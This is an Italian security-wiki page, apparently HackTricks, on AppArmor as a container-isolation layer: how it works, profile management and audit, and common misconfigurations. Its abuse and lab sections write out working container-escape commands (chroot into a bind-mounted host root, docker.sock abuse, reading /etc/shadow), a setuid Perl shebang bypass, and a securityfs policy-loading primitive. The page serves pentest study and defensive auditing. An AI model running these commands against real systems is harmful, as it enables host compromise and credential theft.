# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **controllo obbligatorio degli accessi** che applica restrizioni tramite profili specifici per programma. A differenza dei tradizionali controlli DAC, che dipendono in larga misura dalla proprietà di utenti e gruppi, AppArmor consente al kernel di applicare una policy associata al processo stesso. Negli ambienti container, questo è importante perché un workload potrebbe avere privilegi tradizionali sufficienti per tentare un'azione, ma vedersela comunque negare perché il suo profilo AppArmor non consente il percorso, il mount, il comportamento di rete o l'uso di capability pertinente.

Il concetto più importante è che AppArmor è **basato sui percorsi**. Valuta l'accesso al filesystem tramite regole sui percorsi, anziché tramite etichette, come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che i bind mount e i layout alternativi dei percorsi richiedono particolare attenzione. Se gli stessi contenuti dell'host diventano accessibili tramite un percorso diverso, l'effetto della policy potrebbe non essere quello inizialmente previsto dall'operatore.

## Ruolo nell'isolamento dei container

Le verifiche della sicurezza dei container spesso si fermano alle capability e a seccomp, ma AppArmor continua a essere importante anche dopo questi controlli. Immagina un container con più privilegi del dovuto o un workload che, per ragioni operative, necessita di una capability aggiuntiva. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, la rete e le modalità di esecuzione, impedendo così i percorsi di abuso più ovvi. Per questo disabilitare AppArmor «solo per far funzionare l'applicazione» può trasformare silenziosamente una configurazione rischiosa in una attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Per vedere con quale account è in esecuzione il processo del container:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor associato al profilo scelto dal runtime. Nel caso unconfined, questo ulteriore livello di restrizione scompare.

Puoi anche verificare cosa Docker ritiene di aver applicato:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Utilizzo in fase di esecuzione

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può integrarsi con AppArmor anche sui sistemi basati su AppArmor, sebbene nelle distribuzioni in cui SELinux è il sistema principale, spesso sia quest'ultimo a ricoprire il ruolo centrale. Kubernetes può esporre le policy AppArmor a livello di workload sui nodi che supportano effettivamente AppArmor. Anche LXC e i relativi ambienti di system container della famiglia Ubuntu fanno ampio uso di AppArmor.

Il punto pratico è che AppArmor non è una "funzionalità di Docker". È una funzionalità del kernel host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o al runtime viene chiesto di eseguire il container senza confinamento, la protezione presunta in realtà non c'è.

Per Kubernetes, l'API moderna è `securityContext.appArmorProfile`. A partire da Kubernetes `v1.30`, le vecchie annotazioni beta di AppArmor sono deprecate. Sugli host supportati, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` fa riferimento a un profilo che deve essere già caricato sul nodo. Questo aspetto è importante durante la revisione, perché un manifest può sembrare compatibile con AppArmor pur dipendendo interamente dal supporto del nodo e dai profili precaricati.<sup>[[1]](#references)</sup>

Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più restrittivo che omettere semplicemente il campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'ammissione dovrebbe fallire. Se il campo viene omesso, il workload potrebbe comunque essere eseguito su un nodo senza AppArmor e semplicemente non ricevere questo ulteriore livello di confinamento. Dal punto di vista di un attaccante, è un buon motivo per controllare sia il manifest sia lo stato effettivo del nodo.<sup>[[1]](#references)</sup>

Sugli host compatibili con Docker e AppArmor, il profilo predefinito più noto è `docker-default`. Questo profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati sulle capability continuano a fallire in un container predefinito. In generale, `docker-default` consente il normale traffico di rete, nega le scritture in gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace, impedendo che diventi uno strumento generico per sondare l'host. Capire questa configurazione di base aiuta a distinguere tra "il container ha `CAP_SYS_ADMIN`" e "il container può effettivamente usare quella capability contro le interfacce del kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono di solito archiviati in `/etc/apparmor.d/`. Una convenzione comune consiste nel sostituire le barre nei percorsi degli eseguibili con dei punti. Per esempio, un profilo per `/usr/bin/man` è comunemente archiviato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia in fase di difesa sia di assessment perché, una volta individuato il nome del profilo attivo, spesso è possibile trovare rapidamente il file corrispondente sull'host.

Tra i comandi utili per la gestione lato host ci sono:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Il motivo per cui questi comandi sono importanti in un riferimento sulla sicurezza dei container è che spiegano come vengono effettivamente creati e caricati i profili, come si passa alla complain mode e come si modificano i profili dopo le modifiche all'applicazione. Se un operatore ha l'abitudine di passare i profili alla complain mode durante la risoluzione dei problemi e si dimentica di ripristinare l'enforcement, il container può sembrare protetto nella documentazione pur comportandosi nella realtà in modo molto più permissivo.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento di un'applicazione e aiutare a generare un profilo in modo interattivo:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` può generare un profilo modello che può essere caricato in seguito con `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi trovati nei log e aiutare l'operatore a decidere se consentirli o negarli:

```bash
sudo aa-logprof
```

### Log

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

È utile sia dal punto di vista operativo sia da quello offensivo. I difensori lo usano per perfezionare i profili. Gli attaccanti lo usano per scoprire quale percorso o operazione specifica viene negata e se AppArmor è il controllo che blocca una catena di exploit.

### Identificare il file del profilo esatto

Quando un runtime mostra il nome di un profilo AppArmor specifico per un container, spesso è utile ricondurre quel nome al file del profilo su disco:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Questo è particolarmente utile durante una revisione dal lato host, perché colma il divario tra «il container dichiara di essere in esecuzione con il profilo `lowpriv`» e «le regole effettive si trovano in questo specifico file, che può essere sottoposto ad audit o ricaricato».

### Regole ad alto impatto da sottoporre ad audit

Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano in modo sostanziale l’efficacia di AppArmor contro un tentativo di evasione dal container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: esegue il binario di destinazione senza restrizioni. Se un helper, una shell o un interprete raggiungibile è consentito con `ux`, di solito è la prima cosa da testare.
- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo durante l’exec. Non sono automaticamente dannosi, ma vale la pena sottoporli ad audit, perché una transizione potrebbe portare a un profilo molto più permissivo di quello corrente.
- `change_profile`: consente a un task di passare a un altro profilo caricato, immediatamente o al successivo exec. Se il profilo di destinazione è meno restrittivo, questo può diventare la via di fuga prevista da un dominio restrittivo.
- `flags=(complain)`, `flags=(unconfined)` o il più recente `flags=(prompt)`: dovrebbero modificare il livello di fiducia che riponi nel profilo. `complain` registra le negazioni invece di applicarle, `unconfined` rimuove il confine e `prompt` dipende da un percorso decisionale in userspace anziché da una negazione applicata esclusivamente dal kernel.
- `userns` o `userns create,`: le policy AppArmor più recenti possono mediare la creazione di user namespace. Se un profilo del container lo consente esplicitamente, gli user namespace annidati restano possibili anche quando la piattaforma usa AppArmor come parte della propria strategia di hardening.

Utile comando grep dal lato host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Questo tipo di audit è spesso più utile che esaminare centinaia di normali regole sui file. Se un breakout dipende dall'esecuzione di un helper, dall'ingresso in un nuovo namespace o dall'evasione verso un profilo meno restrittivo, la risposta spesso si nasconde in queste regole orientate alle transizioni, anziché nelle ovvie righe in stile `deny /etc/shadow r`.

## Configurazioni errate

L'errore più ovvio è `apparmor=unconfined`. Gli amministratori spesso lo impostano mentre eseguono il debug di un'applicazione che non funzionava perché il profilo bloccava correttamente qualcosa di pericoloso o imprevisto. Se il flag rimane in produzione, l'intero livello MAC è di fatto rimosso.

Un altro problema meno evidente è presumere che i bind mount siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor si basa sui percorsi, esporre percorsi dell'host in posizioni di mount alternative può interagire male con le regole sui percorsi. Un terzo errore è dimenticare che il nome di un profilo in un file di configurazione serve a ben poco se il kernel dell'host non applica effettivamente AppArmor.

## Abuso

Quando AppArmor non è attivo, operazioni precedentemente limitate possono improvvisamente riuscire: leggere percorsi sensibili tramite bind mount, accedere a parti di procfs o sysfs il cui utilizzo avrebbe dovuto essere più difficile, eseguire operazioni relative ai mount se anche capabilities/seccomp lo consentono oppure usare percorsi che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato sulle capabilities, che sulla carta «dovrebbe funzionare», continua invece a fallire nella pratica. Rimuovi AppArmor e lo stesso tentativo potrebbe iniziare a funzionare.

Se sospetti che AppArmor sia l'unico elemento a bloccare una catena di abuso basata su path-traversal, bind mount o mount, il primo passo consiste di solito nel confrontare ciò che diventa accessibile con e senza un profilo. Per esempio, se un percorso dell'host è montato nel container, inizia controllando se riesci ad attraversarlo e a leggerlo:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Se il container dispone anche di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici consiste nel verificare se AppArmor è il controllo che blocca le operazioni di mount o l’accesso ai filesystem sensibili del kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Negli ambienti in cui un percorso dell’host è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell’host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Il punto di questi comandi non è che AppArmor da solo provochi il breakout. È che, una volta rimosso AppArmor, molti percorsi di abuso basati su filesystem e mount diventano subito testabili.

### Esempio completo: AppArmor disabilitato + root dell’host montata

Se il container ha già la root dell’host montata in bind su `/host`, rimuovere AppArmor può trasformare un percorso di abuso del filesystem bloccato in una completa host escape:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Una volta che la shell viene eseguita tramite il filesystem dell'host, il carico di lavoro è di fatto uscito dai confini del container:

```bash
id
hostname
cat /etc/shadow | head
```

### Esempio completo: AppArmor disabilitato + socket del runtime

Se la vera barriera era AppArmor attorno allo stato del runtime, un socket montato può essere sufficiente per una completa evasione:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Il percorso esatto dipende dal punto di mount, ma il risultato finale è lo stesso: AppArmor non impedisce più l’accesso alla runtime API, che può avviare un container in grado di compromettere l’host.

### Esempio completo: bypass tramite bind mount basato sul percorso

Poiché AppArmor si basa sui percorsi, proteggere `/proc/**` non protegge automaticamente gli stessi contenuti del procfs dell’host quando sono raggiungibili tramite un percorso diverso:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

L'impatto dipende da cosa viene montato esattamente e dal fatto che il percorso alternativo aggiri anche altri controlli, ma questo schema è uno dei motivi più evidenti per cui AppArmor deve essere valutato insieme alla disposizione dei mount, anziché isolatamente.

### Esempio completo: bypass dello shebang

AppArmor può associare un profilo al percorso dello script eseguito, anziché all'interprete indicato dal suo shebang. Al contrario, invocando direttamente l'interprete si può selezionare il profilo dell'interprete. Un [maintainer di AppArmor descrive questa distinzione](https://bugs.launchpad.net/apparmor/+bug/1911431). Un esempio storico riguardava uno script la cui prima riga indicava un interprete confinato:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

L'esempio è solo un caso candidato in cui la capability sui file dell'interprete può diventare effettiva e l'attachment exec effettivo dello script consente l'operazione. Controlla la policy caricata e l'etichetta del processo, il capability bounding set, `no_new_privs` e lo stato `nosuid` del mount; il nome di un file di profilo o una voce `cap_setuid+ep` da soli non dimostrano che la transizione sia utilizzabile. Le catene di interpreti e i percorsi di esecuzione alternativi meritano una verifica separata.

## File di controllo delle policy come primitive di scrittura privilegiata

Sui kernel AppArmor interessati, un utente non privilegiato può aprire in scrittura il file `.load`, `.replace` o `.remove` di securityfs, ma una chiamata diretta a `write()` fallisce perché il permesso di amministrazione delle policy viene verificato al momento della scrittura. Se un helper setuid eredita quel descrittore come stdout o stderr e scrive byte controllati dall'attaccante, il kernel usa le credenziali dell'helper. Questo rende l'helper uno *scrittore privilegiato* di dati di policy, non un mezzo per concedere genericamente i privilegi di root al chiamante. Qualys ha dimostrato che `su -P` può inoltrare byte da un comando eseguito come lo stesso utente attraverso il suo percorso PTY privilegiato; questo metodo richiede che all'account dell'utente sia associata una password. Verifica le correzioni installate per il kernel e `su`, invece di considerare la modalità di un file scrivibile da tutti come prova di esposizione.<sup>[[3]](#references)[[4]](#references)</sup>

In un lab usa e getta con un kernel e un helper interessati, questo crea e poi rimuove un profilo di test. La shell apre ogni file di controllo prima che `su` vi scriva; `stty raw` impedisce al relay PTY di modificare i byte del profilo compilato. Non eseguire il test su un profilo di produzione.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

La stessa primitive può sostituire un profilo esistente. Ad esempio, un profilo che consente `userns` a un launcher può rimuovere una restrizione AppArmor sugli user namespace, ma non concede capabilities di root sull’host; i sysctl effettivi dei namespace e gli altri controlli restano comunque importanti. Può anche rimuovere il confinement da un processo target. Consulta i [controlli di esposizione del kernel](../../../main-system-information/kernel-vulnerability-assessment.md) e la [panoramica di Linux Hardening](../../../) per il workflow più ampio di privilege escalation.<sup>[[3]](#references)[[4]](#references)</sup>

## Verifiche

L’obiettivo di queste verifiche è rispondere rapidamente a tre domande: AppArmor è abilitato sull’host? Il processo corrente è confinato? Il runtime ha effettivamente applicato un profilo a questo container?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Cosa è interessante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il carico di lavoro non beneficia della protezione di AppArmor.
- Se `aa-status` indica che AppArmor è disabilitato o non caricato, qualsiasi nome di profilo nella configurazione del runtime è perlopiù cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo personalizzato inatteso, spesso è questo il motivo per cui funziona una tecnica di abuso basata sul filesystem o sui mount.
- Se `/sys/kernel/security/apparmor/profiles` non contiene il profilo previsto, la configurazione del runtime o dell’orchestratore non è sufficiente da sola.
- Se un profilo che dovrebbe essere protetto contiene regole come `ux`, `change_profile` con ambito ampio, `userns` o `flags=(complain)`, la protezione effettiva può essere molto più debole di quanto suggerisca il nome del profilo.

Se un container dispone già di privilegi elevati per ragioni operative, lasciare AppArmor abilitato spesso fa la differenza tra un’eccezione controllata e una violazione della sicurezza molto più ampia.

## Impostazioni predefinite dei runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita sugli host compatibili con AppArmor | Usa il profilo AppArmor `docker-default`, a meno che non venga specificato diversamente | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipende dall’host | AppArmor è supportato tramite `--security-opt`, ma il comportamento predefinito esatto dipende dall’host/runtime ed è meno uniforme del profilo `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il valore predefinito è `RuntimeDefault`, ma viene applicato solo se AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto per AppArmor |
| containerd / CRI-O sotto Kubernetes | Dipende dal supporto del nodo/runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l’applicazione effettiva dipende comunque dal supporto del nodo e dalle impostazioni del workload | Come nella riga Kubernetes; anche la configurazione diretta del runtime può disabilitare completamente AppArmor |

Per AppArmor, la variabile più importante è spesso l’**host**, non solo il runtime. Un’impostazione del profilo in un manifest non attiva la protezione su un nodo in cui AppArmor non è abilitato.



## References

- [1] [Contesto di sicurezza Kubernetes: campi del profilo AppArmor e comportamento in base al supporto del nodo](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Pagina man di `apparmor.d(5)` di Ubuntu 24.04: transizioni di esecuzione, `change_profile`, `userns` e flag dei profili](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Avviso tecnico Qualys CrackArmor](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Base di conoscenza sulle vulnerabilità Ubuntu CrackArmor](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
